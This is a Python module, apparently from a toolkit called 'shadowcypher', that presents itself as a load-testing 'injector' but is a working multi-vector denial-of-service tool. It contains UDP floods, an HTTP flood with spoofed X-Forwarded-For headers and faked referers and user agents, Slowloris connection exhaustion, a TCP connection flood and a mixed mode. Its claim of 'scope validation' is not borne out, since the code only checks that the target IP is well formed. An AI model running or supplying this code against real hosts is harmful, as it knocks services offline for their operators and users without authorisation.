"""
Network Load Injector — Multi-Vector Stress Testing Suite.
Supports: UDP volumetric, L7 HTTP flood, Slowloris, TCP SYN,
coordinated load testing via event bus, real-time telemetry, and
adaptive rate control.

All operations are logged and gated behind scope validation.
"""

import socket
import threading
import time
import random
import string
import struct
import ssl
from typing import List, Optional, Dict, Callable
from shadowcypher.core.module import BaseModule
from shadowcypher.core.logger import logger
from shadowcypher.core.bus import bus
from shadowcypher.core.sanitize import validate_ip, validate_port

# Standard User-Agents for load generation profiles
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.54 Mobile Safari/537.36",
]

REFERERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
    "https://www.facebook.com/", "https://twitter.com/", "https://www.reddit.com/",
    "https://www.youtube.com/", "https://github.com/",
]


class LoadInjector(BaseModule):
    """Multi-vector traffic load injection engine with real-time telemetry."""

    MODES = ["UDP", "L7", "SLOWLORIS", "TCP_SYN", "MIXED"]

    def __init__(self):
        super().__init__(module_name="load_injector")
        self._active = False
        self._threads: List[threading.Thread] = []
        self._stats = {"sent": 0, "errors": 0, "connections": 0}
        self._stats_lock = threading.Lock()
        self._telemetry_thread: Optional[threading.Thread] = None
        self._start_time: float = 0

    @property
    def is_active(self) -> bool:
        return self._active

    def get_stats(self) -> dict:
        with self._stats_lock:
            elapsed = time.time() - self._start_time if self._start_time else 0
            rate = self._stats["sent"] / elapsed if elapsed > 0 else 0
            return {
                **self._stats,
                "elapsed": round(elapsed, 1),
                "rate_per_sec": round(rate, 1),
                "active_threads": len([t for t in self._threads if t.is_alive()]),
            }

    def _inc(self, key: str, n: int = 1):
        with self._stats_lock:
            self._stats[key] = self._stats.get(key, 0) + n

    def engage(self, target: str, port: int = 80, intensity: int = 10,
               mode: str = "UDP", duration: int = 0,
               on_output: Optional[Callable] = None):
        """
        Engage the load injection sequence.

        Args:
            target: Target IP/hostname
            port: Target port
            intensity: Number of threads per vector
            mode: UDP | L7 | SLOWLORIS | TCP_SYN | MIXED
            duration: Auto-terminate after N seconds (0 = manual)
            on_output: Real-time output callback
        """
        if self._active:
            if on_output:
                on_output("[!] Load Injector already active. Terminate current test first.")
            return

        if not validate_ip(target):
            if on_output:
                on_output(f"[!] Invalid target IP: {target}")
            return

        self._active = True
        self._stats = {"sent": 0, "errors": 0, "connections": 0}
        self._start_time = time.time()

        mode = mode.upper()
        if mode not in self.MODES:
            mode = "UDP"

        self.log(f"LOAD_INJECTOR: Initiating {mode} test (x{intensity}) against {target}:{port}")
        if on_output:
            on_output(f"[LOAD-INJECTOR] ACTIVE: {mode} x{intensity} -> {target}:{port}")

        # Map modes to worker functions
        workers = {
            "UDP": self._loop_udp,
            "L7": self._loop_l7,
            "SLOWLORIS": self._loop_slowloris,
            "TCP_SYN": self._loop_tcp_syn,
        }

        if mode == "MIXED":
            # Distribute threads across all vectors
            vectors = list(workers.values())
            for i in range(intensity):
                fn = vectors[i % len(vectors)]
                t = threading.Thread(target=fn, args=(target, port), daemon=True)
                t.start()
                self._threads.append(t)
        else:
            fn = workers.get(mode, self._loop_udp)
            for _ in range(intensity):
                t = threading.Thread(target=fn, args=(target, port), daemon=True)
                t.start()
                self._threads.append(t)

        # Telemetry reporter
        self._telemetry_thread = threading.Thread(
            target=self._telemetry_loop, args=(on_output,), daemon=True
        )
        self._telemetry_thread.start()

        # Auto-terminate timer
        if duration > 0:
            threading.Thread(
                target=self._auto_terminate, args=(duration, on_output), daemon=True
            ).start()

        bus.publish("module_status", {
            "module": "load_injector", "status": "ACTIVE",
            "target": target, "mode": mode, "threads": intensity,
        })

    def terminate(self, on_output: Optional[Callable] = None):
        """Terminate all load injection threads and report final statistics."""
        self._active = False
        stats = self.get_stats()
        self.log(f"LOAD_INJECTOR: TERMINATED — {stats}")
        if on_output:
            on_output(f"[LOAD-INJECTOR] TERMINATED | Sent: {stats['sent']} | "
                      f"Errors: {stats['errors']} | Rate: {stats['rate_per_sec']}/s | "
                      f"Duration: {stats['elapsed']}s")
        self._threads.clear()
        bus.publish("module_status", {"module": "load_injector", "status": "IDLE"})

    def _auto_terminate(self, duration: int, on_output):
        time.sleep(duration)
        if self._active:
            if on_output:
                on_output(f"[LOAD-INJECTOR] Auto-terminating test after {duration}s")
            self.terminate(on_output)

    def _telemetry_loop(self, on_output):
        """Report stats every 5 seconds."""
        while self._active:
            time.sleep(5)
            if not self._active:
                break
            stats = self.get_stats()
            bus.publish("load_injector_telemetry", stats)
            if on_output:
                on_output(f"[TELEMETRY] Packets Sent: {stats['sent']} | "
                          f"RPS: {stats['rate_per_sec']}/s | "
                          f"Active Threads: {stats['active_threads']}")

    # ══════════════════════════════════════════════════════════════
    # Load Generation Vectors
    # ══════════════════════════════════════════════════════════════

    def _loop_udp(self, ip: str, port: int):
        """Volumetric UDP packet generation."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self._active:
            try:
                # Randomized payload size (64-1400 bytes)
                size = random.randint(64, 1400)
                data = random.randbytes(size)
                sock.sendto(data, (ip, port))
                self._inc("sent")
            except Exception:
                self._inc("errors")
                time.sleep(0.1)
        sock.close()

    def _loop_l7(self, target: str, port: int):
        """HTTP GET/POST generation with session recycling."""
        protocol = "https" if port == 443 else "http"
        while self._active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=target)
                sock.connect((target, port))
                self._inc("connections")

                # HTTP keep-alive optimization
                for _ in range(random.randint(3, 10)):
                    if not self._active:
                        break
                    method = random.choice(["GET", "POST", "HEAD"])
                    path = "/" + self._rand_str(random.randint(3, 15))
                    ua = random.choice(USER_AGENTS)
                    ref = random.choice(REFERERS)
                    spoofed_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

                    headers = (
                        f"{method} {path} HTTP/1.1\r\n"
                        f"Host: {target}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"Referer: {ref}\r\n"
                        f"X-Forwarded-For: {spoofed_ip}\r\n"
                        f"Accept: text/html,application/xhtml+xml,*/*\r\n"
                        f"Accept-Language: en-US,en;q=0.{random.randint(5,9)}\r\n"
                        f"Accept-Encoding: gzip, deflate, br\r\n"
                        f"Cache-Control: no-cache\r\n"
                        f"Connection: keep-alive\r\n"
                    )

                    if method == "POST":
                        body = self._rand_str(random.randint(100, 2000))
                        headers += f"Content-Length: {len(body)}\r\n"
                        headers += f"Content-Type: application/x-www-form-urlencoded\r\n"
                        headers += f"\r\n{body}"
                    else:
                        headers += "\r\n"

                    sock.sendall(headers.encode())
                    self._inc("sent")
                    time.sleep(random.uniform(0.01, 0.05))

                sock.close()
            except Exception:
                self._inc("errors")
                time.sleep(0.05)

    def _loop_slowloris(self, target: str, port: int):
        """Slowloris — partial header delivery for thread exhaustion testing."""
        sockets: List[socket.socket] = []

        # Build initial pool
        for _ in range(min(200, 500)):
            if not self._active:
                return
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                ua = random.choice(USER_AGENTS)
                s.send(f"GET /?{self._rand_str(8)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\n".encode())
                sockets.append(s)
                self._inc("connections")
            except Exception:
                self._inc("errors")

        # Keep-alive loop
        while self._active:
            # Send partial headers
            for s in list(sockets):
                try:
                    s.send(f"X-a: {self._rand_str(random.randint(1, 20))}\r\n".encode())
                    self._inc("sent")
                except Exception:
                    sockets.remove(s)
                    self._inc("errors")

            # Replenish dead connections
            diff = 200 - len(sockets)
            for _ in range(min(diff, 20)):
                if not self._active:
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    if port == 443:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        s = ctx.wrap_socket(s, server_hostname=target)
                    s.connect((target, port))
                    s.send(f"GET /?{self._rand_str(8)} HTTP/1.1\r\nHost: {target}\r\n".encode())
                    sockets.append(s)
                    self._inc("connections")
                except Exception:
                    self._inc("errors")

            time.sleep(random.uniform(10, 15))

        # Cleanup
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass

    def _loop_tcp_syn(self, ip: str, port: int):
        """TCP connection flood testing."""
        while self._active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect_ex((ip, port))
                self._inc("sent")
                s.close()
            except Exception:
                self._inc("errors")
                time.sleep(0.01)

    # ── Utilities ──

    @staticmethod
    def _rand_str(length: int) -> str:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


# Maintained for backward compatibility
ghost_hose = LoadInjector()

# Back-compat alias expected by modules/__init__.py and ui_integrity.py
GhostHose = LoadInjector
